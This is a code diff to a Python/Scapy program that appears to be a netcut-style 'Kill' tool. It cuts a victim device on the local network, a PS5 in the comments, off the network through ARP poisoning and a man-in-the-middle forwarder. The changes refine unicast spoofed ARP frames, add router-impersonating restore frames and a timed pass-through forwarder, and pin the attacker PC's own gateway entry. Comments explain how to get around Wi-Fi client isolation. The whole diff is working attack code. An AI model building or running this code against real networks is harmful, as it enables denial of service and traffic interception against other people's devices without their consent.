@@ -1,5 +1,5 @@
 from scapy.all import ARP, Ether, conf
-from time import sleep
+from time import monotonic, sleep
 import sys
 import threading
 
@@ -193,6 +193,26 @@ def _apply_windows_ip_forwarding_ifaces(
 
 _forwarding_priority_iface: str | None = None
 _forwarding_priority_only: bool = False
+
+# After Kill OFF, leftover MITM still delivers frames here until ARP expires.
+# Keep a 100% pass-through (never hard-drop) so WAN is not black-holed.
+_RESTORE_PASS_S = 60.0
+
+
+def _forwarder_is_pass_all(fw) -> bool:
+    """True when the Npcap forwarder is live and forwarding both directions."""
+    if fw is None or not getattr(fw, 'running', False):
+        return False
+    if getattr(fw, 'drop_from_victim', False) or getattr(fw, 'drop_to_victim', False):
+        return False
+    try:
+        if int(getattr(fw, 'pass_from_victim_pct', 0) or 0) < 100:
+            return False
+        if int(getattr(fw, 'pass_to_victim_pct', 0) or 0) < 100:
+            return False
+    except Exception:
+        return False
+    return True
 
 
 def _drain_windows_ip_forwarding_applies() -> None:
@@ -448,6 +468,8 @@ class Killer:
         self.pf_blocks = set()
         # Leftover MACs from older keep-relay Kill OFF; discarded on kill/unkill.
         self._unkill_relays = set()
+        # MAC -> monotonic deadline for post-OFF 100% pass-through.
+        self._restore_pass_until = {}
         self._socket = None  # Persistent L2 socket
         self._socket_token: str | None = None  # Npcap bind token that opened _socket
         # Npcap/Scapy L2socket is not safe for concurrent send from Kill GUI + ARP worker.
@@ -726,6 +748,61 @@ class Killer:
         if ip and mac_address_is_usable(mac) and mac != mine:
             self._restore_router = {'ip': ip, 'mac': mac}
 
+    def _pin_local_gateway_neighbor_async(self) -> None:
+        """Reinstall this PC's real gateway neighbor so broadcast/reflected poison cannot black-hole us."""
+        if not sys.platform.startswith('win'):
+            return
+        ip, mac = self._restore_router_endpoint()
+        if not ip or not mac_address_is_usable(mac):
+            return
+        iface_name = str(getattr(self.iface, 'name', '') or '').strip()
+        if not iface_name or iface_name == 'NULL':
+            return
+        mac_hy = good_mac(mac).replace(':', '-').upper()
+
+        def _work() -> None:
+            show_s = ''
+            try:
+                show = run_command(
+                    ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
+                    shell=False,
+                    timeout=6,
+                )
+                show_s = str(getattr(show, 'stdout', None) or '')
+            except Exception:
+                show_s = ''
+            keys = _priority_iface_keys(iface_name, show_s) or [iface_name]
+            for key in keys:
+                for verb in ('set', 'add'):
+                    try:
+                        proc = run_command(
+                            [
+                                'netsh',
+                                'interface',
+                                'ipv4',
+                                verb,
+                                'neighbors',
+                                key,
+                                ip,
+                                mac_hy,
+                            ],
+                            shell=False,
+                            timeout=3,
+                        )
+                        if int(getattr(proc, 'returncode', 1) or 1) == 0:
+                            return
+                    except Exception:
+                        continue
+
+        try:
+            threading.Thread(
+                target=safe_daemon_target(_work),
+                name='zubcut-pin-gw',
+                daemon=True,
+            ).start()
+        except Exception:
+            pass
+
     def _restore_router_endpoint(self) -> tuple[str, str]:
         """Gateway IP/MAC for restore. Never use this PC's MAC as the gateway."""
         ip = str((self.router or {}).get('ip') or '').strip()
@@ -848,7 +925,9 @@ class Killer:
         # ARP worker generation so ON state recovers from stale/desynced workers.
         seq = self._next_op_seq(mac)
         self.killed[mac] = victim
+        self._cancel_restore_pass(mac)
         self._stop_forwarder(mac)
+        self._pin_local_gateway_neighbor_async()
         # Instant path first: poison + cut. Forwarding disable / probes come after.
         self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
         self._kill_arp_worker(
@@ -1042,20 +1121,19 @@ class Killer:
             pass
 
     def _poison_frames(self, victim):
-        """Unicast ARP poison, plus Wi‑Fi victim-targeted broadcast when isolation drops STA unicast.
+        """Unicast ARP poison only (victim MAC + router MAC).
 
         Do **not** broadcast gateway impersonation. A ff:ff:ff ARP with
-        ``psrc=router`` teaches every listening client that this PC is the
-        gateway and can drop whole-LAN internet.
+        ``psrc=router`` teaches every listening client — including this PC —
+        that we are the gateway. Combined with ``disable_ip_forwarding`` that
+        drops this machine's internet for minutes after a short Kill toggle.
+
+        The ethernet PS5 is STA-to-wired, not STA-to-STA. Unicast to its MAC
+        is the delivery that does not take the rest of the LAN down.
 
         Send both ARP *request* (op=1) and *reply* (op=2) unicast to the
         victim and router. Many stacks ignore unsolicited unicast replies but
-        still cache the sender mapping from a request — reply-only poison was
-        too weak after broadcast removal.
-
-        On Wi‑Fi, AP client isolation often drops STA-to-STA *unicast*, so the
-        PS5 never sees those frames and Kill does nothing. Add victim-targeted
-        L2 broadcast copies (pdst/hwdst still this victim only — not a GARP).
+        still cache the sender mapping from a request.
         """
         src = self._poison_hwsrc()
         # Victim: "router is at PC MAC"
@@ -1098,34 +1176,6 @@ class Killer:
             to_router_req,
             to_router_reply,
         ]
-        try:
-            from tools.mitm_probe import iface_is_wireless
-
-            wifi = iface_is_wireless(self.iface)
-        except Exception:
-            wifi = False
-        if wifi:
-            bcast = 'ff:ff:ff:ff:ff:ff'
-            frames.extend(
-                [
-                    Ether(src=src, dst=bcast)
-                    / ARP(
-                        op=1,
-                        psrc=self.router['ip'],
-                        hwsrc=src,
-                        pdst=victim['ip'],
-                        hwdst=victim['mac'],
-                    ),
-                    Ether(src=src, dst=bcast)
-                    / ARP(
-                        op=2,
-                        psrc=self.router['ip'],
-                        hwsrc=src,
-                        pdst=victim['ip'],
-                        hwdst=victim['mac'],
-                    ),
-                ]
-            )
         return frames
 
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
@@ -1156,6 +1206,11 @@ class Killer:
             try:
                 with self._socket_lock:
                     for frame in frames:
+                        if (
+                            self._op_seq.get(victim['mac']) != seq
+                            or victim['mac'] not in self.killed
+                        ):
+                            return
                         sock.send(frame)
             except Exception:
                 # Socket died mid-burst — let the threaded worker recover.
@@ -1183,6 +1238,11 @@ class Killer:
                     for tok in tokens:
                         try:
                             for frame in frames:
+                                if (
+                                    self._op_seq.get(victim['mac']) != seq
+                                    or victim['mac'] not in self.killed
+                                ):
+                                    return
                                 sendp(frame, iface=tok, verbose=0)
                             sent = True
                             break
@@ -1280,6 +1340,113 @@ class Killer:
             return True
         except Exception:
             return False
+
+    def _cancel_restore_pass(self, mac) -> None:
+        try:
+            (self._restore_pass_until or {}).pop(mac, None)
+        except Exception:
+            pass
+
+    def _arm_restore_pass_stop(self, mac, seq) -> None:
+        """Stop the post-OFF pass-through after ARP has had time to expire."""
+        if not mac:
+            return
+        if not isinstance(getattr(self, '_restore_pass_until', None), dict):
+            self._restore_pass_until = {}
+        self._restore_pass_until[mac] = monotonic() + _RESTORE_PASS_S
+
+        def _work() -> None:
+            sleep(_RESTORE_PASS_S)
+            if self._op_seq.get(mac) != seq or mac in self.killed:
+                return
+            until = (getattr(self, '_restore_pass_until', None) or {}).get(mac, 0)
+            try:
+                if until and monotonic() < float(until) - 0.25:
+                    return
+            except Exception:
+                pass
+            try:
+                (self._restore_pass_until or {}).pop(mac, None)
+            except Exception:
+                pass
+            if mac not in self.killed:
+                self._stop_forwarder(mac)
+
+        try:
+            threading.Thread(
+                target=safe_daemon_target(_work),
+                name='zubcut-restore-pass-stop',
+                daemon=True,
+            ).start()
+        except Exception:
+            pass
+
+    def _start_restore_pass_forwarder(self, victim) -> bool:
+        """Start a 100% pass forwarder without re-arming Kill / ``killed``."""
+        if not isinstance(victim, dict):
+            return False
+        mac = victim.get('mac')
+        if not mac or mac in self.killed:
+            return False
+        if self.resume_percent_cut_live(mac):
+            return True
+        router_ip, router_mac = self._restore_router_endpoint()
+        if not router_ip or not mac_address_is_usable(router_mac):
+            return False
+        if not mac_address_is_usable(victim.get('mac')):
+            return False
+        tokens = npcap_iface_tokens(self.iface)
+        if not tokens:
+            return False
+        fw = MitmForwarder()
+        fw.start(
+            victim=victim,
+            router={'ip': router_ip, 'mac': router_mac},
+            iface_name=tokens[0],
+            iface_mac=self.iface.mac,
+            drop_from_victim=False,
+            drop_to_victim=False,
+            pass_from_victim_pct=100,
+            pass_to_victim_pct=100,
+            iface_alts=tokens[1:],
+        )
+        self.forwarders[mac] = fw
+        if not getattr(fw, 'running', False):
+            self.forwarders.pop(mac, None)
+            return False
+        return True
+
+    def _ensure_restore_pass(self, victim, seq) -> None:
+        """Flip leftover MITM to 100% pass so OFF is not a black hole."""
+        mac = str((victim or {}).get('mac') or '') if isinstance(victim, dict) else ''
+        if not mac or mac in self.killed:
+            return
+        if self.resume_percent_cut_live(mac):
+            self._arm_restore_pass_stop(mac, seq)
+            return
+        snap = {
+            'mac': (victim or {}).get('mac'),
+            'ip': (victim or {}).get('ip'),
+            'vendor': (victim or {}).get('vendor'),
+        }
+
+        def _work() -> None:
+            if self._op_seq.get(mac) != seq or mac in self.killed:
+                return
+            if self.resume_percent_cut_live(mac):
+                self._arm_restore_pass_stop(mac, seq)
+                return
+            if self._start_restore_pass_forwarder(snap):
+                self._arm_restore_pass_stop(mac, seq)
+
+        try:
+            threading.Thread(
+                target=safe_daemon_target(_work),
+                name='zubcut-restore-pass',
+                daemon=True,
+            ).start()
+        except Exception:
+            pass
 
     def _unblock_victim_firewall(self, victim) -> None:
         """Drop Kill's Windows Firewall / pf block immediately (do not wait on restore)."""
@@ -1388,6 +1555,12 @@ class Killer:
             and self._op_seq.get(victim['mac']) == seq
         ):
             for frame in frames:
+                if (
+                    victim['mac'] not in self.killed
+                    or self.iface.name == 'NULL'
+                    or self._op_seq.get(victim['mac']) != seq
+                ):
+                    return
                 self._send_packet(frame)
             if warmup_remaining > 0:
                 warmup_remaining -= 1
@@ -1407,8 +1580,9 @@ class Killer:
                 sleep(step)
                 slept += step
 
-        if victim['mac'] not in self.killed:
-            self._stop_forwarder(victim['mac'])
+        # Do not stop the forwarder here. OFF flips it to 100% pass; stopping
+        # while ARP is still poisoned black-holes WAN (Analysis AFTER then
+        # false-passes on LAN ping + "forwarder cleared").
 
     def unkill(self, victim, *, ics_mode=False):
         """
@@ -1416,6 +1590,8 @@ class Killer:
 
         Removes from ``self.killed`` on the caller thread before ARP restore runs
         in the background, so the UI does not race with _sync_killed_devices().
+        LAN OFF keeps a 100% pass-through until ARP expires — stopping the
+        dropper immediately leaves leftover MITM with forwarding off.
         """
         self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
         mac = victim['mac']
@@ -1426,7 +1602,12 @@ class Killer:
         if isinstance(relays, set):
             relays.discard(mac)
         self._unblock_victim_firewall(victim)
-        self._stop_forwarder(mac)
+        if ics_mode:
+            self._cancel_restore_pass(mac)
+            self._stop_forwarder(mac)
+        else:
+            self._ensure_restore_pass(victim, seq)
+            self._pin_local_gateway_neighbor_async()
         # Immediate ARP burst with no sleep — sleeps belong in @threaded _unkill_restore_worker
         # so the GUI thread returns instantly on Kill/Lag/Dupe OFF.
         # Never open a cold Npcap L2 socket on this thread (0.5–2s, or hang).
@@ -1454,16 +1635,18 @@ class Killer:
             self.prewarm_l2_socket(join_ms=0)
 
     def _restore_frames(self, victim):
-        """Undo poison with the same delivery Kill ON used.
+        """Honest gateway restore (unicast + Wi‑Fi broadcast with real router MAC).
 
-        The PS5 is on ethernet; this PC is on mesh Wi‑Fi. Isolation drops
-        STA unicast, which is why poison uses victim-targeted L2 broadcast.
-        Unicast-only restore never reaches the console — it stays on the fake
-        gateway until the ethernet link flaps.
+        Poison is unicast-only so this PC is not taught that it is the gateway.
+        Restore still uses victim-targeted L2 broadcast with ``hwsrc=router_mac``
+        so an ethernet console behind isolation can unlearn a leftover mapping.
 
-        Broadcast copies are the poison shape with honest ``hwsrc=router_mac``
-        and ``pdst=victim`` (not a GARP). Do not broadcast ``psrc=victim_ip``
-        from this PC — that re-teaches the router the PS5 is here.
+        Also send victim-destined copies whose Ethernet source is the real
+        router MAC (some stacks ignore ARP when Ether src != hwsrc). The AP
+        may drop a spoofed SA; harmless if it does.
+
+        Do not broadcast ``psrc=victim_ip`` from this PC — that re-teaches
+        the router the PS5 is here.
         """
         src = self._poison_hwsrc()
         router_ip, router_mac = self._restore_router_endpoint()
@@ -1501,6 +1684,20 @@ class Killer:
             pdst=router_ip,
             hwdst=router_mac,
         )
+        as_router_req = Ether(src=router_mac, dst=victim_mac) / ARP(
+            op=1,
+            psrc=router_ip,
+            hwsrc=router_mac,
+            pdst=victim_ip,
+            hwdst=victim_mac,
+        )
+        as_router_reply = Ether(src=router_mac, dst=victim_mac) / ARP(
+            op=2,
+            psrc=router_ip,
+            hwsrc=router_mac,
+            pdst=victim_ip,
+            hwdst=victim_mac,
+        )
         frames = [
             to_victim_req,
             to_victim_reply,
@@ -1508,6 +1705,8 @@ class Killer:
             to_router_reply,
             to_router_req,
             to_router_reply,
+            as_router_req,
+            as_router_reply,
         ]
         try:
             from tools.mitm_probe import iface_is_wireless
@@ -1582,7 +1781,6 @@ class Killer:
                 return
             self._restore_arp_now(victim, seq, repeats=repeats, delay_s=0.08)
         if self._op_seq.get(victim['mac']) == seq and victim['mac'] not in self.killed:
-            self._stop_forwarder(victim['mac'])
             self._remove_pf_block(victim['ip'])
 
     def kill_all(self, device_list):
